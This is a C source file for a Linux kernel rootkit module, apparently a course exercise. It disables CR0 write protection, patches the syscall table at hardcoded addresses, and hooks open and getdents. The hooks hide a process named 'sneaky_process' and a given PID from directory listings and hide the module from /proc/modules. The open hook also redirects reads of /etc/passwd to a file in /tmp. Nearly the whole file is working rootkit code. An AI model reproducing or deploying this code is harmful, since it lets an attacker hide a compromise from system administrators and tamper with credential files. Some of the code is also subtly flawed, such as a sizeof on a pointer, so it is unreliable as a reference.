#include <asm/cacheflush.h>
#include <asm/current.h> // process information
#include <asm/page.h>
#include <asm/unistd.h>    // for system call constants
#include <linux/highmem.h> // for changing page permissions
#include <linux/init.h>    // for entry/exit macros
#include <linux/kallsyms.h>
#include <linux/kernel.h> // for printk and other kernel bits
#include <linux/module.h> // for all modules
#include <linux/sched.h>

// Macros for kernel functions to alter Control Register 0 (CR0)
// This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
// Bit 0 is the WP-bit (write protection). We want to flip this to 0
// so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))
#define BUFFLEN 1024

struct linux_dirent {
  u64 d_ino;
  s64 d_off;
  unsigned short d_reclen;
  char d_name[BUFFLEN];
};

// These are function pointers to the system calls that change page
// permissions for the given address (page) to read-only or read-write.
// Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-4.4.0-116-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81072040;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81071fc0;

// This is a pointer to the system call table in memory
// Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
// We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long *)0xffffffff81a00200;
// static bool hide_spid_flag = False;
static bool hide_module_flag = false;
static char *spid = "";
module_param(spid, charp, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
MODULE_PARM_DESC(spid, "sneaky_process pid");

// Function pointer will be used to save address of original 'open' syscall.
// The asmlinkage keyword is a GCC #define that indicates this function
// should expect ti find its arguments on the stack (not in registers).
// This is used for all system calls.
asmlinkage int (*original_call)(const char *pathname, int flags);

asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp,
                                    unsigned int count);

asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);

asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
                                   unsigned int count) {
  int returned_sz = original_getdents(fd, dirp, count);
  struct linux_dirent *curr = dirp;
  int cursor = 0;
  while (cursor < returned_sz) {

    curr = (struct linux_dirent *)((char *)dirp + cursor);
    unsigned short curr_reclen = curr->d_reclen;
    // check sneaky_process
    if (!strcmp(curr->d_name, "sneaky_process") ||
        !strcmp(curr->d_name, spid)) {

      if (!strcmp(curr->d_name, "sneaky_process")) {
        printk(KERN_INFO "Found Sneaky Process\n");
      } else if (!strcmp(curr->d_name, spid)) {
        printk(KERN_INFO "Found Sneaky PID\n");
      }

      char *next = (char *)curr + curr_reclen;
      size_t sz_dif = (size_t)(next - (char *)dirp);
      size_t count = returned_sz - sz_dif;
      memmove(curr, next, count);
      returned_sz = returned_sz - curr_reclen;
      continue;
    }

    cursor = cursor + curr->d_reclen;
  }
  return returned_sz;
}

// Define our new sneaky version of the 'open' syscall
// Need to consider /proc and /proc/modules
// If hide_spid_flag ==True, close it and change it to False.
// If hide_module_flag ==True,close it and change it to False.

/* asmlinkage int sneaky_sys_open(const char *pathname, int flags) { */
/*   printk(KERN_INFO "Very, very Sneaky!\n"); */
/*   return original_call(pathname, flags); */
/* } */

asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
  int result;
  int status;
  char *original_path = "/etc/passwd";
  char *temp_path = "/tmp/passwd";
  // char *proc_dir = "/proc";
  char *proc_modules = "/proc/modules";
  if (!strcmp(original_path, pathname)) {
    printk(KERN_INFO "Starting to open tmp/passwd\n");
    status = copy_to_user((void *)pathname, temp_path, sizeof(temp_path));
    if (status) {
      printk(KERN_INFO "Fail to call copy_to_user\n");
    } else {
      printk(KERN_INFO "Successfully called copy_to_user\n");
    }

  } else {
    /* if (!strcmp(pathname, proc_dir)) { */
    /*   printk(KERN_INFO "Starting to hide Sneaky PID.\n"); */
    /*   hide_spid_flag = True; */
    /* } */
    if (!strcmp(pathname, proc_modules)) {
      printk(KERN_INFO "Starting to hide Sneaky Module.\n");
      hide_module_flag = true;
    }
  }
  result = original_call(pathname, flags);
  return result;
}

asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
  ssize_t byte_read;

  byte_read = original_read(fd, buf, count);
  if (hide_module_flag) {
    char *module_name = "sneaky_module";
    char *module_ptr = strstr(buf, module_name);
    if (module_ptr) {
      char *curr = strstr(buf, "\n");
      ssize_t sz_diff = (size_t)(curr - (char *)buf);
      ssize_t count = byte_read - sz_diff;
      ssize_t sneaky_module_sz = (size_t)(curr - module_ptr);
      memcpy(module_ptr, curr + 1, count);
      byte_read = byte_read - sneaky_module_sz;
    }
    hide_module_flag = false;
  }
  return byte_read;

  // if()
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void) {
  struct page *page_ptr;

  // See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  // Get a pointer to the virtual page containing the address
  // of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  // Make this page read-write accessible
  pages_rw(page_ptr, 1);

  // This is the magic! Save away the original 'open' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_call = (void *)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;

  original_getdents = (void *)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;

  // original_read = (void *)*(sys_call_table + __NR_read);
  // *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;

  // Revert page to read-only
  pages_ro(page_ptr, 1);
  // Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0; // to show a successful load
}

static void exit_sneaky_module(void) {
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n");

  // Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  // Get a pointer to the virtual page containing the address
  // of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  // Make this page read-write accessible
  pages_rw(page_ptr, 1);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_open) = (unsigned long)original_call;
  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
  // *(sys_call_table + __NR_read) = (unsigned long)original_read;

  // Revert page to read-only
  pages_ro(page_ptr, 1);
  // Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}

MODULE_LICENSE("ws146");
module_init(initialize_sneaky_module); // what's called upon loading
module_exit(exit_sneaky_module);       // what's called upon unloading
